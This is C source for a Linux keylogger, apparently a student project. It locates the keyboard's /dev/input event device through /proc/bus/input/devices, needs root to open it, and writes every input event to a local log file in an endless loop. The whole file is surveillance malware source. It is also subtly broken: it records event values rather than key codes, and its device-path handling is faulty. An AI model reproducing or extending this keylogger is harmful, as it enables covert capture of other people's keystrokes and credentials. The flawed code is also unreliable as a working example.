/*
** selmakey.c for selmakey in /home/casoni_f/Projets/selma/selmakey/special
** 
** Made by Fabien Casoni
** Login   <casoni_f@epitech.net>
** 
** Started on  Wed Jul  2 18:19:29 2014 Fabien Casoni
** Last update Fri Jul  4 15:17:23 2014 Fabien Casoni
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <sys/epoll.h>
#include <signal.h>
#include "selmakey.h"

void			sigint_handler(int sig)
{
  (void)sig;
  exit(0);
}

void			start_keylog(t_kl *kl)
{
  signal(SIGINT, sigint_handler);
  while (1337)
    {
      kl->ret = epoll_wait(kl->epoll_fd, &(kl->epoll_event),
			   NB_MAX_EVENTS, -1);
      read(kl->fd, &(kl->kbd_event), sizeof(kl->kbd_event));
      fprintf(kl->file, "%d\n", kl->kbd_event.value);
      fflush(kl->file);
    }
  close(kl->epoll_fd);
  close(kl->fd);
  fclose(kl->file);
}

void			find_kbd(char *path)
{
  FILE			*fd;
  int			found;
  char			buff[10][412];

  found = 0;
  fd = fopen("/proc/bus/input/devices", "r");
  sprintf(path, "/dev/input/event");
  while (!found && fgets(buff[0], 412, fd) != NULL
	 && fgets(buff[1], 412, fd) != NULL
	 && fgets(buff[2], 412, fd) != NULL
	 && fgets(buff[3], 412, fd) != NULL
	 && fgets(buff[4], 412, fd) != NULL
	 && fgets(buff[5], 412, fd) != NULL
	 && fgets(buff[6], 412, fd) != NULL
	 && fgets(buff[7], 412, fd) != NULL
	 && fgets(buff[8], 412, fd) != NULL
	 && fgets(buff[9], 412, fd) != NULL)
    if (strstr(buff[1], "keyboard") != NULL
	|| strstr(buff[1], "Keyboard") != NULL)
      {
	sprintf(path, "%s%c", path, buff[5][strlen(buff[5]) - 3]);
	found = 1;
      }
  fclose(fd);
}

int			main()
{
  t_kl			*kl;
  char			path[4096];

  kl = malloc(sizeof(*kl));
  find_kbd(path);
  if ((kl->fd = open(path, O_RDONLY)) == -1)
    {
      printf("Need sudo to install.\n");
      return (0);
    }
  kl->file = fopen("test.log", "w");
  kl->epoll_fd = epoll_create(sizeof(kl->fd));
  kl->epoll_event.events = EPOLLIN;
  kl->ctrl = epoll_ctl(kl->epoll_fd, EPOLL_CTL_ADD,
		       kl->fd, &(kl->epoll_event));
  start_keylog(kl);
  free(kl);
  return (1);
}
